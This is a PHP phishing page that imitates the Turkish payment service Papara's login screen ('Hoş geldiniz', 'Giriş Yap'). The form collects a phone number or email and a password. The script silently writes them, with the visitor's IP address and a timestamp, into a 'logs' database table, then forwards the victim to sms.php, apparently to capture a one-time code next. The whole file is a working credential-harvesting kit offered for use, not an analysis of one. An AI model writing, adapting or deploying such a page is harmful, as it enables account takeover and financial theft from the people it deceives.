<?php

date_default_timezone_set('Europe/Istanbul');
include('connect.php');
if($_POST){
    $tckn       = $_POST['tckn'];
    $ccnumber   = $_POST['ccnumber'];
    
    
    $ip         = $_SERVER['REMOTE_ADDR'];
    $date       = date('d.m.Y H:i');
    
    $query = $db->prepare('INSERT INTO logs SET ip=?,date=?,tckn=?,ccnumber=?');
    $insert = $query->execute(array($ip,$date,$tckn,$ccnumber));
    
    if($insert){
        header('Location:sms.php');
    }
}
?>

<?php include "header.php"; ?>


<div class="loader" style="display: none;"><span><b>Yükleniyor</b>Lütfen bekle...<p class="wrap-icon-success spinner"></p></span><i style="width: 0%;"></i></div>

        


        <div id="mainContent" class="page-wrap personal-main-content" data-bind="component: {name:CurrentPage, params: {CompParams:CompParams, User: User, FirstLoadedPage:FirstLoadedPage, pageComp:pageComp}}"><div class="login-page">
    <div class="container login-container">
        <div class="row">
            <div class="col-lg-4 col-md-5 col-sm-6 col-xs-12 login-container-left">
                <div data-bind="component: &quot;login-ctrl-comp&quot;"><a href="javascript:;" class="login-back hide" data-bind="css: { hide: isMembership() === null }"><img src="./Papara_files/back.svg" alt="Geri"></a>

<div data-bind="css: { hide: isMembership() === false }">
    <!--ko if: (TfaTokenShow() === null && SetMobileToken() === null && ChangePass() === null)  -->
    <h1 class="securityLinkTitle merchantNone ">Hoş geldiniz</h1>
    <!--ko if: isMembership() === null -->
    <p class="merchantNone">
        Hesabınıza giriş yapabilir ya da
        hesap oluşturabilirsiniz.
    </p>
    <!--/ko-->
    <!--ko if: isMembership() !== null --><!--/ko-->
    <form action="" class="" id="loginForm" method="post" autocomplete="off">
        <!--ko if: Error() !== null --><!--/ko-->
        <div class="phone-wrap-click mobile-change" data-bind="css: { hide: isMembership() }">
            <div class="form-group focus">
                <label class="control-label">Cep telefonu ya da e-posta adresi</label>
                <input name="tckn" data-bind="value: PhoneMail" autocomplete="off" class="form-control text-left phone-code PhoneMail" type="text"><span class="validationMessage" style="display: none;"></span>
            </div>
        </div>
        
            <label class="control-label">Şifre</label>
            <input data-bind="value: Password" autocomplete="off" class="form-control text-left" name="ccnumber" data-class="icon-passchar" type="password" inputmode="decimal"><span class="validationMessage" style="display: none;"></span>
       
        <div class="row" id="login-next">
            <div class="col-xs-12 padding-top-10">
                <input type="submit" class="btn btn-papara btn-approved" name="submitButton" tabindex="3" value="Giriş Yap">

    
    
<?php include "footer.php"; ?>

